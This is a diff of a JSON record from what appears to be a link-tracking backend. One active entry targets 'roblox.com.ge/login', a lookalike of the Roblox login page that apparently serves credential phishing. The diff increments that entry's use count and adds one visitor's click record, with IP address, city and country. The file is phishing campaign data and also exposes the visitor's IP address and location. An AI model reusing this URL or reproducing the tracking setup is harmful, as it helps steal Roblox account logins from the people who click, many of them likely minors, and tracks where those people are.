@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1405,
+    "useCount": 1406,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11408,6 +11408,14 @@
         "city": "Spokane",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777426977033,
+        "ip": "112.198.160.161",
+        "country": "Philippines",
+        "city": "Cagayan de Oro",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
